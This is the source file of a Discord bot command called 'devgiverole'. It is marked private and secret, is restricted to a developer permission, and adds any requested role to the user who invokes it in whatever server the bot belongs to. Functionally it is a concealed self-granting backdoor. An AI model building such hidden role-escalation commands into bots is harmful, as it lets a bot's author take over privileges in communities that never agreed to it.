const Util = require("../utils/util.js")
const ICommand = require("../interfaces/ICommand.js")

class Command extends ICommand {
    constructor(client) {
        super(client, {
            name: "devgiverole",
            desc: "",
            aliases: [
                "dgiverole",
                "dgr"
            ],
            args: [
                {
                    name: "role"
                }
            ],
            perms: [
                "DEV"
            ],
            private: true,
            secret: true
        })
    }

    async execute(message, inputs) {
        if (!Util.doesMemberHavePermission(message.guild.me, ["MANAGE_ROLES"])) return Util.replyError(message, ":tired_face: Sorry");

        let role = await Util.parseRole(message.guild, inputs[0])

        if (role) {
            try {
                await message.member.roles.add(role)
                Util.replyMessage(message, ":+1: Duty executed.")
            } catch(e) {
                console.error(e)
            }
        } else {
            Util.replyMessage(message, ":-1: Mission failed, we'll get'em next time.")
        }
    }
}

module.exports = Command